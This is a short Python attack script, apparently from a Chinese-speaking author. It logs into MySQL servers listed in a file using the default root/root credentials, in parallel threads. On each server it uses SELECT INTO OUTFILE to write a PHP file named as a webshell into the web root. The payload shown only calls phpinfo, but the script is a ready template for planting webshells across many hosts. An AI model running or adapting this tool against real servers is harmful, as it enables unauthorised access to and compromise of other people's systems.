#!/usr/bin/python3
# coding: utf-8

import MySQLdb
import threading
import queue

port = 3306
username = 'root'
password = 'root'
path = '/var/www/html/.log.php'
webshell = '<?=phpinfo();'

q = queue.Queue()
lock = threading.Lock()


def exec_sql(ip, port, username, password, path, webshell):
    try:
        conn = MySQLdb.connect(host=ip, port=port, user=username, passwd=password, db='')
        print(f"[+] {ip} 连接成功")

        try:
            cur = conn.cursor()

            cur.execute('DROP database IF EXISTS `abcd666`;')
            cur.execute('create database abcd666;')
            cur.execute('use abcd666;')

            sql = f'select "{webshell}" into outfile "{path}"'
            cur.execute(sql)

            cur.close()
            print(f"[+] {ip} 执行成功")
        except:
            print(f"[-] {ip} 执行失败")
            return
    except:
        print(f"[-] {ip} 连接失败")
        return

def main():
    ips = []
    with open('ip.txt', 'r') as f:
        ips = f.readlines()

    th = []
    th_num = len(ips)
    for ip in ips:
        t=threading.Thread(target=exec_sql, args=(ip.strip(), port, username, password, path, webshell))
        th.append(t)
    for x in range(th_num):
        th[x].start()
    for x in range(th_num):
        th[x].join()
    # q.join()

main()